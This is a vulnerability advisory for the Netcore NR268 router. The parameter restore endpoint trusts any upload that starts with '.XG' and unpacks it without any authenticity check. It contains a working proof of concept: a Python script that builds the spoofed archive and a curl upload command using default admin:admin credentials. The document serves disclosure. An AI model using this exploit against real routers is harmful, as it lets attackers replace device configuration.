# Netcore NR268 Parameter Restore Trusts an Unsigned Archive Prefix

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Insufficient Verification of Data Authenticity (CWE-345)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

The NR268 parameter restore path accepts any uploaded archive that begins with the three-byte marker `.XG`. After that prefix matches, the restore chain strips those three bytes and untars the remainder with no signature, MAC, or full-file integrity check over the configuration payload. An attacker who can reach `/router/parame_put_file.cgi` can therefore prepend `.XG` to an attacker-controlled `tar.gz` containing `tmp/param.file` and have the router unpack it as trusted device configuration.

## Technical Details

`/router/parame_put_file.cgi` validates only the first three bytes of the upload against `.XG`. After the prefix matches, the handler strips exactly those bytes and unpacks the remainder as a `tar.gz` archive. There is no signature, HMAC, or whole-file digest over the configuration payload.

An attacker who can reach the restore route can:

1. build a `tar.gz` archive containing attacker-controlled `tmp/param.file`
2. prepend the three-byte prefix `.XG`
3. upload the resulting file as `put_file`

The router accepts the prefix, strips it, and unpacks the attacker-controlled archive into the restore chain.

### Affected Endpoint

- URL: `/router/parame_put_file.cgi`
- Parameters: multipart field `put_file`
- Method: POST
- Authentication: HTTP Basic authentication to the parameter restore route

## Proof of Concept

```python
#!/usr/bin/env python3
import io
import sys
import tarfile
from pathlib import Path

buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w:gz") as tar:
    payload = b"attacker-controlled configuration\n"
    info = tarfile.TarInfo("tmp/param.file")
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))
Path(sys.argv[1]).write_bytes(b".XG" + buf.getvalue())
print("wrote", sys.argv[1])
```

```bash
python3 build_xg_restore_payload.py restore.XG
xxd -g 1 -l 16 restore.XG
# first three bytes are 2e 58 47 (".XG"); remaining data starts with gzip magic 1f 8b

curl -s -u admin:admin -F "put_file=@restore.XG;filename=restore.XG" \
  "http://192.168.1.1/router/parame_put_file.cgi"
```

### Outcome

The generated file begins with `.XG`. After the handler strips the first three bytes, the remainder is a valid `tar.gz` containing `tmp/param.file`, and the restore path unpacks it without any signature or MAC check.

## Impact

- **Confidentiality:** High
- **Integrity:** High – device configuration can be replaced
- **Availability:** High

An attacker who can reach the restore route can submit an unsigned archive that is trusted as device configuration.
